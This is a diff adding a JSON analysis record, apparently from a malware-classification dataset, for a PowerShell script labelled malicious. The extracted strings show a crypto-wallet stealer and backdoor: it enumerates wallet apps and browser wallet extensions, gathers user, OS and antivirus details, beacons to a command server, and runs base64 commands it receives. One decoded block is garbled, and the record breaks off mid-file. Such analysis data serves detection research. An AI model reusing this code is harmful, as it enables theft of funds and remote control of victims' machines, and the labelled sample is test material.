@@ -1,0 +1,264 @@
+{
+  "meta": {
+    "quelldatei": "0bbce92b547f0e99a37636b090cb05d9633cc05e1ce876e0076ca32dc4c901c4.ps1",
+    "sha256": "0bbce92b547f0e99a37636b090cb05d9633cc05e1ce876e0076ca32dc4c901c4",
+    "groesse_bytes": 29490,
+    "zeilen": 397,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Z2V0IC92Mi8wZjNhNTRlYy00MTkxLTRmZWItOTc5MS04MmY5MTI3NzQ5OGU/dj12ZXIlNWYyIGh0dHAvMS4xDQpob3N0OiB3bWFpbC1lbmRwb2ludC5jb20NCmNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCnByYWdtYTogbm8tY2FjaGUNCmNhY2hlLWNvbnRyb2w6IG5vLWNhY2hlDQp1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOiAxDQp1c2VyLWFnZW50OiBtb3ppbGxhLzUuMCAod2luZG93cyBudCAxMC4wOyB3aW42NDsgeDY0KSBhcHBsZXdlYmtpdC81MzcuMzYgKGtodG1sLCBsaWtlIGdlY2tvKSBjaHJvbWUvNzYuMC4zODA5LjcxIHNhZmFyaS81MzcuMzYNCmFjY2VwdC1sYW5ndWFnZTogZW4tdXMsZW47cT0wLjkNCmFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMw0KYWNjZXB0LWVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQoNCg==",
+      "6626b3d5-9306-45cb-91ca-3e86a88840e2",
+      "`r`n",
+      ";\r\n$http_request.path = $_requestline[1].Replace(",
+      ").Replace(",
+      ");\r\n\r\nfor ($i = 1; $i -lt $_headers.Length; $i++) {\r\n    [string[]]$h = $_headers[$i] -split ",
+      ";\r\n    if ($h.Length -lt 2) {\r\n        break;\r\n    }\r\n    $http_headers[$h[0]] = $h[1];\r\n}\r\n\r\n$user_auth = @{\r\n    id = -1;\r\n};\r\n\r\n$client = New-Object ",
+      "\r\n\r\nfunction WMI {\r\n    param (\r\n        $namespace,\r\n        $class\r\n    )\r\n    try {\r\n        return Get-WmiObject -Namespace $namespace -Class $class;\r\n    }\r\n    catch {\r\n    }\r\n    return $null;\r\n}\r\n\r\nfunction Get-AvStatus {\r\n    param (\r\n        $av\r\n    )\r\n    $status = \"Unknown\";\r\n    try {\r\n        $v = [uint32]::Parse($av.productState) -band 0xF000;\r\n        switch ($v) {\r\n            0x0000 { $status = \"Disabled\" }\r\n            0x1000 { $status = \"Enabled\" }\r\n            0x2000 { $status = \"Snoozed\" }\r\n            0x3000 { $status = \"Expired\" }\r\n        }\r\n    }\r\n    catch {\r\n\r\n    }\r\n    return \"$($av.displayName) ($status)\";\r\n}\r\n\r\nfunction Get-InstallStatus {\r\n    param (\r\n        $appname\r\n    )\r\n    $active = 0;\r\n    $inactive = 0;\r\n    $rgx = New-Object ",
+      "\\s?--load-extension=((\"[^\\r\\n\"]*\")|([^\\r\\n\\s]*))",
+      "*.LNK",
+      "OrdinalIgnoreCase",
+      "');\r\n                        $enabled = ((Test-Path $path) -eq $true);\r\n                    }\r\n                }\r\n                if ($enabled) {\r\n                    $active++;\r\n                }\r\n                else {\r\n                    $inactive++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    if (($active -eq 0) -and ($inactive -eq 0)) {\r\n        return $null;\r\n    }\r\n    elseif ($inactive -gt 0) {\r\n        return 'NOK';\r\n    }\r\n    return 'OK';\r\n}\r\n\r\n$searchPaths = @(\r\n    ",
+      ",\r\n    ",
+      "\r\n);\r\n\r\n$searchEntries = @(\r\n    [pscustomobject]@{\r\n        root    = '%appdata%'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Exodus-A'\r\n            path = 'Exodus'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Atomic-A'\r\n            path = 'Atomic Wallet'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Electrum-A'\r\n            path = 'Electrum'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Ledger-A'\r\n            path = 'Ledger Live'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-A'\r\n            path = 'Jaxx Liberty'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'com.liberty.jaxx-A'\r\n            path = 'com.liberty.jaxx'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Guarda-A'\r\n            path = 'Guarda'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Armory-A'\r\n            path = 'Armory'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'DELTA-A'\r\n            path = 'DELTA'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'TREZOR-A'\r\n            path = 'TREZOR Bridge'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Bitcoin-A'\r\n            path = 'Bitcoin'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'binance-A'\r\n            path = 'binance'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Blockstream-A'\r\n            path = 'Blockstream Green'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinomi-A'\r\n            path = 'Coinomi'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\Google\\Chrome\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-C'\r\n            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'MEWcx-C'\r\n            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coin98-C'\r\n            path = 'aeachknmefphepccionboohckonoeemg'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Binance-C'\r\n            path = 'fhbohimaelbohpjbbldcngcnapndodjp'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-C'\r\n            path = 'cjelfplplebdjjenllpjcblmjkfcffne'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinbase-C'\r\n            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-E'\r\n            path = 'ejbalbakoplchlghecdalmeeeajnimhm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinomi-E'\r\n            path = 'gmcoclageakkbkbbflppkbpjcbkcfedg'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-B'\r\n            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'MEWcx-B'\r\n            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coin98-B'\r\n            path = 'aeachknmefphepccionboohckonoeemg'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Binance-B'\r\n            path = 'fhbohimaelbohpjbbldcngcnapndodjp'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-B'\r\n            path = 'cjelfplplebdjjenllpjcblmjkfcffne'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinbase-B'\r\n            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'\r\n        }\r\n    }\r\n);\r\n\r\nfunction Get-Apps {\r\n    $results = New-Object Collections.Generic.List[string];\r\n\r\n    $appEntries = @('chrome.exe', 'brave.exe', 'msedge.exe');\r\n    foreach ($appEntry in $appEntries) {\r\n        $status = Get-InstallStatus $appEntry;\r\n        if ($null -eq $status) {\r\n            continue;\r\n        }\r\n        $results.Add(",
+      ");\r\n    }\r\n\r\n    foreach ($entry in $searchEntries) {\r\n        $rootdir = [System.Environment]::ExpandEnvironmentVariables($entry.root);\r\n        foreach ($target in $entry.targets) {\r\n            if ((Test-Path -Path (Join-Path -Path $rootdir -ChildPath $target.path))) {\r\n                $results.Add($target.name)\r\n            }\r\n        }\r\n    }\r\n    return [string]::Join(', ', $results);\r\n}\r\n\r\nfunction Get-UserInfo {\r\n    $os = WMI ",
+      "Win32_OperatingSystem",
+      "Collections.Generic.List[string]",
+      "root\\SecurityCenter",
+      "AntiVirusProduct",
+      "root\\SecurityCenter2",
+      "$($os.Caption) ($($os.OSArchitecture))",
+      "$($env:USERDOMAIN)\\$($env:USERNAME)",
+      "$([string]::Join(', ', $avs))",
+      "cf-connecting-ip",
+      "cf-ipcountry",
+      "\\?v=(.*)&?",
+      "System.IO.MemoryStream",
+      "Host",
+      "$(-join ((97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 10) | % {[char]$_})).com",
+      "http://wmail-endpoint.com",
+      ";\r\n    }\r\n    return [BitConverter]::ToInt32($res, 0);\r\n}\r\n\r\nfunction Build-Request {\r\n    param (\r\n        [bool]\r\n        $update\r\n    )\r\n\r\n    if ($user_auth.id -eq -1) {\r\n        $user_auth.id = Get-UserId;\r\n    }\r\n\r\n    $ms = New-Object 'System.IO.MemoryStream'\r\n    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);\r\n    $ms.WriteByte(2);\r\n    $ms.Write([BitConverter]::GetBytes([int]$user_auth.id), 0, 4);\r\n    if ($update) {\r\n        $_userinfo = '';\r\n        try {\r\n            $_userinfo = Get-UserInfo;\r\n        }\r\n        catch {\r\n            $_userinfo = ConvertTo-Json @{\r\n                error  = $_.Exception.Message;\r\n                line   = $_.Exception.Line;\r\n                offset = $_.Exception.Offset;\r\n            }\r\n        }\r\n        [byte[]]$userinfo = [Text.Encoding]::UTF8.GetBytes($_userinfo);\r\n        $ms.Write($userinfo, 0, $userinfo.Length);\r\n    }\r\n    $data = $ms.ToArray();\r\n    $ms.Dispose();\r\n    return $data;\r\n}\r\n\r\nfunction Run-Command {\r\n    param (\r\n        [string]\r\n        $command\r\n    )\r\n    $lines = $command -split ",
+      ";\r\n    foreach ($line in $lines) {\r\n        $job = Start-Job -ScriptBlock ([Scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($line))))\r\n        Wait-Job -Job $job -Timeout 10\r\n    }\r\n}\r\n\r\n#$wdg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(",
+      "));\r\n#$wdgjob = Start-Job -ScriptBlock ([Scriptblock]::Create($wdg)); \r\n\r\n\r\n$update = $true;\r\n$retry = 0;\r\n[byte[]]$res = $null;\r\nwhile ($retry -lt 10) {\r\n    try {\r\n        $client.Headers[",
+      "] = ",
+      ";\r\n        $res = $client.UploadData("
+    ],
+    "string_anzahl_gesamt": 40,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 684,
+        "dekodiert": "get /v2/0f3a54ec-4191-4feb-9791-82f91277498e?v=ver%5f2 http/1.1\r\nhost: wmail-endpoint.com\r\nconnection: keep-alive\r\npragma: no-cache\r\ncache-control: no-cache\r\nupgrade-insecure-requests: 1\r\nuser-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.71 safari/537.36\r\naccept-language: en-us,en;q=0.9\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\naccept-encoding: gzip, deflate"
+      },
+      {
+        "laenge": 16960,
+        "dekodiert": "卛獹整⹭湅楶潲浮湥嵴㨺畃牲湥䑴物捥潴祲㴠␠坐⹄慐桴഻䄊摤吭灹⁥倭瑡⁨␢湥㩶楷摮物䵜捩潲潳瑦丮呅䙜慲敭潷歲㐶癜⸴⸰〳ㄳ尹祓瑳浥刮湵楴敭搮汬㬢਍摁ⵤ祔数ⴠ慐桴∠攤癮眺湩楤屲楍牣獯景⹴䕎屔牆浡睥牯㙫尴㑶〮㌮㌰㤱卜獹整⹭畒瑮浩⹥湉整潲印牥楶散⹳汤≬഻ഊ␊牣慥整乤睥㴠␠牴敵഻␊畭整乸浡⁥‽䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧卛獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹䡓㉁㘵㩝䌺敲瑡⡥⸩潃灭瑵䡥獡⡨呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㔴㔹␱␨湥㩶佃偍呕剅䅎䕍ㄩ㠲㔸⠤攤癮唺䕓乒䵁⥅㌲㤴⤢⤩഻␊畭整⁸‽卛獹整⹭桔敲摡湩⹧畍整嵸㨺敮⡷琤畲ⱥ␠畭整乸浡ⱥ嬠敲嵦挤敲瑡摥敎⥷഻椊⁦␨牣慥整乤睥ⴠ煥␠慦獬⥥笠਍††敲畴湲഻紊਍਍愤獳浥汢敩⁳‽敎⵷扏敪瑣ⴠ祔数慎敭匠獹整⹭潃汬捥楴湯⹳敇敮楲⹣楄瑣潩慮祲嬧瑳楲杮‬祓瑳浥刮晥敬瑣潩⹮獁敳扭祬❝ⴠ牁畧敭瑮楌瑳⠠卛牴湩䍧浯慰敲嵲㨺牏楤慮䥬湧牯䍥獡⥥਍潦敲捡⁨␨獡敳扭祬椠⁮嬨灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敇䅴獳浥汢敩⡳⤩ ൻ †␠獡敳扭楬獥孛祓瑳浥䤮⹏慐桴㩝䜺瑥楆敬慎敭␨獡敳扭祬䰮捯瑡潩⥮⁝‽愤獳浥汢㭹਍ൽഊ昊湵瑣潩⁮敇⵴湕慳敦畆据楴湯笠਍††慰慲⁭ന †††嬠瑳楲杮൝ †††␠潭畤敬ബ †††嬠瑳楲杮൝ †††␠慮敭ബ †††嬠祴数嵛൝ †††␠慰慲獭ബ †††嬠祴数൝ †††␠敲瑴灹൥ †⤠਍††渤⁡‽愤獳浥汢敩孳匧獹整⹭汤❬⹝敇呴灹⡥✨楍牣獯景❴⬠✠圮湩㈳✮⬠✠湕慳敦❎⬠✠瑡癩䵥瑥潨獤⤧㬩਍††朤⁰‽渤⹡敇䵴瑥潨⡤䜧瑥牐捯摁牤獥❳‬呛灹孥嵝䀠✨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥Ⱗ✠瑳楲杮⤧㬩਍††洤⁤‽渤⹡敇䵴瑥潨⡤䜧瑥潍畤敬慈摮敬⤧䤮癮歯⡥渤汵ⱬ䀠␨潭畤敬⤩഻ †␠瑰⁲‽朤⹰湉潶敫␨畮汬‬⡀嬨祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䠮湡汤剥晥㩝渺睥嬨扯敪瑣㩝渺睥⤨‬洤⥤Ⱙ␠慮敭⤩഻ †␠畢㴠嬠灁䑰浯楡嵮㨺畃牲湥䑴浯楡⹮敄楦敮祄慮業䅣獳浥汢⡹卛獹整⹭敒汦捥楴湯䄮獳浥汢乹浡嵥㨺敮⡷✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩Ⱙ嬠祓瑳浥刮晥敬瑣潩⹮浅瑩䄮獳浥汢䉹極摬牥捁散獳㩝刺湵⸩敄楦敮祄慮業䵣摯汵⡥✨❟⬠嬠畧摩㩝为睥畇摩⤨吮卯牴湩⡧⤩‬昤污敳⸩敄楦敮祔数⠨弧‧‫杛極嵤㨺敎䝷極⡤⸩潔瑓楲杮⤨Ⱙ✠汃獡ⱳ倠扵楬Ᵽ匠慥敬Ɽ䄠獮䍩慬獳‬畁潴汃獡❳‬卛獹整⹭畍瑬捩獡䑴汥来瑡嵥㬩਍††戤⹵敄楦敮潃獮牴捵潴⡲刧協数楣污慎敭‬楈敤祂楓Ⱨ倠扵楬❣‬卛獹整⹭敒汦捥楴湯䌮污楬杮潃癮湥楴湯嵳㨺瑓湡慤摲‬瀤牡浡⥳匮瑥浉汰浥湥慴楴湯汆条⡳刧湵楴敭‬慍慮敧❤㬩਍††戤⹵敄楦敮敍桴摯✨湉潶敫Ⱗ✠畐汢捩‬楈敤祂楓Ⱨ丠睥汓瑯‬楖瑲慵❬‬爤瑥祴数‬瀤牡浡⥳匮瑥浉汰浥湥慴楴湯汆条⡳刧湵楴敭‬慍慮敧❤㬩਍††搤汥㴠␠畢䌮敲瑡呥灹⡥㬩਍††敲畴湲嬠祓瑳浥刮湵楴敭䤮瑮牥灯敓癲捩獥䴮牡桳污㩝䜺瑥敄敬慧整潆䙲湵瑣潩偮楯瑮牥␨瑰Ⱳ␠敤⥬഻紊਍਍਍判来獩整䍲慬獳硅㴠䜠瑥唭獮晡䙥湵瑣潩⁮甧敳㍲⸲汤❬✠敒楧瑳牥汃獡䕳坸‧⡀䥛瑮瑐嵲 嬨䥕瑮㘱⥝഻␊牃慥整楗摮睯硅㴠䜠瑥唭獮晡䙥湵瑣潩⁮甧敳㍲⸲汤❬✠牃慥整楗摮睯硅❗䀠嬨䥕瑮㈳ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠䥕瑮㈳ⱝ嬠湉㍴崲‬䥛瑮㈳ⱝ嬠湉㍴崲‬䥛瑮㈳ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠湉側牴ⱝ嬠湉側牴⥝⠠䥛瑮瑐嵲㬩਍䜤瑥敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䜧瑥敍獳条坥‧⡀䥛瑮瑐嵲‬䥛瑮瑐嵲‬啛湉㍴崲‬啛湉㍴崲 嬨湉㍴崲㬩਍吤慲獮慬整敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧吧慲獮慬整敍獳条❥䀠嬨湉側牴⥝⠠䉛潯敬湡⥝഻␊楄灳瑡档敍獳条⁥‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䐧獩慰捴䵨獥慳敧❗䀠嬨湉側牴⥝⠠䥛瑮瑐嵲㬩਍䄤摤汃灩潢牡䙤牯慭䱴獩整敮⁲‽敇⵴湕慳敦畆据楴湯✠獵牥㈳搮汬‧䄧摤汃灩潢牡䙤牯慭䱴獩整敮❲䀠嬨"
+      }
+    ],
+    "base64_bloecke_gesamt": 2
+  },
+  "stufe2_features": {
+    "strings": [
+      "Z2V0IC92Mi8wZjNhNTRlYy00MTkxLTRmZWItOTc5MS04MmY5MTI3NzQ5OGU/dj12ZXIlNWYyIGh0dHAvMS4xDQpob3N0OiB3bWFpbC1lbmRwb2ludC5jb20NCmNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCnByYWdtYTogbm8tY2FjaGUNCmNhY2hlLWNvbnRyb2w6IG5vLWNhY2hlDQp1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOiAxDQp1c2VyLWFnZW50OiBtb3ppbGxhLzUuMCAod2luZG93cyBudCAxMC4wOyB3aW42NDsgeDY0KSBhcHBsZXdlYmtpdC81MzcuMzYgKGtodG1sLCBsaWtlIGdlY2tvKSBjaHJvbWUvNzYuMC4zODA5LjcxIHNhZmFyaS81MzcuMzYNCmFjY2VwdC1sYW5ndWFnZTogZW4tdXMsZW47cT0wLjkNCmFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMw0KYWNjZXB0LWVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQoNCg==",
+      "6626b3d5-9306-45cb-91ca-3e86a88840e2",
+      "`r`n",
+      ";\r\n$http_request.path = $_requestline[1].Replace(",
+      ").Replace(",
+      ");\r\n\r\nfor ($i = 1; $i -lt $_headers.Length; $i++) {\r\n    [string[]]$h = $_headers[$i] -split ",
+      ";\r\n    if ($h.Length -lt 2) {\r\n        break;\r\n    }\r\n    $http_headers[$h[0]] = $h[1];\r\n}\r\n\r\n$user_auth = @{\r\n    id = -1;\r\n};\r\n\r\n$client = New-Object ",
+      "\r\n\r\nfunction WMI {\r\n    param (\r\n        $namespace,\r\n        $class\r\n    )\r\n    try {\r\n        return Get-WmiObject -Namespace $namespace -Class $class;\r\n    }\r\n    catch {\r\n    }\r\n    return $null;\r\n}\r\n\r\nfunction Get-AvStatus {\r\n    param (\r\n        $av\r\n    )\r\n    $status = \"Unknown\";\r\n    try {\r\n        $v = [uint32]::Parse($av.productState) -band 0xF000;\r\n        switch ($v) {\r\n            0x0000 { $status = \"Disabled\" }\r\n            0x1000 { $status = \"Enabled\" }\r\n            0x2000 { $status = \"Snoozed\" }\r\n            0x3000 { $status = \"Expired\" }\r\n        }\r\n    }\r\n    catch {\r\n\r\n    }\r\n    return \"$($av.displayName) ($status)\";\r\n}\r\n\r\nfunction Get-InstallStatus {\r\n    param (\r\n        $appname\r\n    )\r\n    $active = 0;\r\n    $inactive = 0;\r\n    $rgx = New-Object ",
+      "\\s?--load-extension=((\"[^\\r\\n\"]*\")|([^\\r\\n\\s]*))",
+      "*.LNK",
+      "OrdinalIgnoreCase",
+      "');\r\n                        $enabled = ((Test-Path $path) -eq $true);\r\n                    }\r\n                }\r\n                if ($enabled) {\r\n                    $active++;\r\n                }\r\n                else {\r\n                    $inactive++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    if (($active -eq 0) -and ($inactive -eq 0)) {\r\n        return $null;\r\n    }\r\n    elseif ($inactive -gt 0) {\r\n        return 'NOK';\r\n    }\r\n    return 'OK';\r\n}\r\n\r\n$searchPaths = @(\r\n    ",
+      ",\r\n    ",
+      "\r\n);\r\n\r\n$searchEntries = @(\r\n    [pscustomobject]@{\r\n        root    = '%appdata%'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Exodus-A'\r\n            path = 'Exodus'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Atomic-A'\r\n            path = 'Atomic Wallet'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Electrum-A'\r\n            path = 'Electrum'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Ledger-A'\r\n            path = 'Ledger Live'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-A'\r\n            path = 'Jaxx Liberty'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'com.liberty.jaxx-A'\r\n            path = 'com.liberty.jaxx'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Guarda-A'\r\n            path = 'Guarda'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Armory-A'\r\n            path = 'Armory'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'DELTA-A'\r\n            path = 'DELTA'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'TREZOR-A'\r\n            path = 'TREZOR Bridge'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Bitcoin-A'\r\n            path = 'Bitcoin'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'binance-A'\r\n            path = 'binance'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Blockstream-A'\r\n            path = 'Blockstream Green'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinomi-A'\r\n            path = 'Coinomi'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\Google\\Chrome\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-C'\r\n            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'MEWcx-C'\r\n            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coin98-C'\r\n            path = 'aeachknmefphepccionboohckonoeemg'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Binance-C'\r\n            path = 'fhbohimaelbohpjbbldcngcnapndodjp'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-C'\r\n            path = 'cjelfplplebdjjenllpjcblmjkfcffne'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinbase-C'\r\n            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-E'\r\n            path = 'ejbalbakoplchlghecdalmeeeajnimhm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinomi-E'\r\n            path = 'gmcoclageakkbkbbflppkbpjcbkcfedg'\r\n        }\r\n    },\r\n    [pscustomobject]@{\r\n        root    = '%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions'\r\n        targets =\r\n        [pscustomobject]@{\r\n            name = 'Metamask-B'\r\n            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'MEWcx-B'\r\n            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coin98-B'\r\n            path = 'aeachknmefphepccionboohckonoeemg'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Binance-B'\r\n            path = 'fhbohimaelbohpjbbldcngcnapndodjp'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Jaxx-B'\r\n            path = 'cjelfplplebdjjenllpjcblmjkfcffne'\r\n        },\r\n        [pscustomobject]@{\r\n            name = 'Coinbase-B'\r\n            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'\r\n        }\r\n    }\r\n);\r\n\r\nfunction Get-Apps {\r\n    $results = New-Object Collections.Generic.List[string];\r\n\r\n    $appEntries = @('chrome.exe', 'brave.exe', 'msedge.exe');\r\n    foreach ($appEntry in $appEntries) {\r\n        $status = Get-InstallStatus $appEntry;\r\n        if ($null -eq $status) {\r\n            continue;\r\n        }\r\n        $results.Add(",
+      ");\r\n    }\r\n\r\n    foreach ($entry in $searchEntries) {\r\n        $rootdir = [System.Environment]::ExpandEnvironmentVariables($entry.root);\r\n        foreach ($target in $entry.targets) {\r\n            if ((Test-Path -Path (Join-Path -Path $rootdir -ChildPath $target.path))) {\r\n                $results.Add($target.name)\r\n            }\r\n        }\r\n    }\r\n    return [string]::Join(', ', $results);\r\n}\r\n\r\nfunction Get-UserInfo {\r\n    $os = WMI ",
+      "Win32_OperatingSystem",
+      "Collections.Generic.List[string]",
+      "root\\SecurityCenter",
+      "AntiVirusProduct",
+      "root\\SecurityCenter2",
+      "$($os.Caption) ($($os.OSArchitecture))",
+      "$($env:USERDOMAIN)\\$($env:USERNAME)",
+      "$([string]::Join(', ', $avs))",
+      "cf-connecting-ip",
+      "cf-ipcountry",
+      "\\?v=(.*)&?",
+      "System.IO.MemoryStream",
+      "Host",
+      "$(-join ((97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 10) | % {[char]$_})).com",
+      "http://wmail-endpoint.com",
+      ";\r\n    }\r\n    return [BitConverter]::ToInt32($res, 0);\r\n}\r\n\r\nfunction Build-Request {\r\n    param (\r\n        [bool]\r\n        $update\r\n    )\r\n\r\n    if ($user_auth.id -eq -1) {\r\n        $user_auth.id = Get-UserId;\r\n    }\r\n\r\n    $ms = New-Object 'System.IO.MemoryStream'\r\n    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);\r\n    $ms.WriteByte(2);\r\n    $ms.Write([BitConverter]::GetBytes([int]$user_auth.id), 0, 4);\r\n    if ($update) {\r\n        $_userinfo = '';\r\n        try {\r\n            $_userinfo = Get-UserInfo;\r\n        }\r\n        catch {\r\n            $_userinfo = ConvertTo-Json @{\r\n                error  = $_.Exception.Message;\r\n                line   = $_.Exception.Line;\r\n                offset = $_.Exception.Offset;\r\n            }\r\n        }\r\n        [byte[]]$userinfo = [Text.Encoding]::UTF8.GetBytes($_userinfo);\r\n        $ms.Write($userinfo, 0, $userinfo.Length);\r\n    }\r\n    $data = $ms.ToArray();\r\n    $ms.Dispose();\r\n    return $data;\r\n}\r\n\r\nfunction Run-Command {\r\n    param (\r\n        [string]\r\n        $command\r\n    )\r\n    $lines = $command -split ",
+      ";\r\n    foreach ($line in $lines) {\r\n        $job = Start-Job -ScriptBlock ([Scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($line))))\r\n        Wait-Job -Job $job -Timeout 10\r\n    }\r\n}\r\n\r\n#$wdg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(",
+      "));\r\n#$wdgjob = Start-Job -ScriptBlock ([Scriptblock]::Create($wdg)); \r\n\r\n\r\n$update = $true;\r\n$retry = 0;\r\n[byte[]]$res = $null;\r\nwhile ($retry -lt 10) {\r\n    try {\r\n        $client.Headers[",
+      "] = ",
+      ";\r\n        $res = $client.UploadData("
+    ],
+    "string_anzahl_gesamt": 40,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 684,
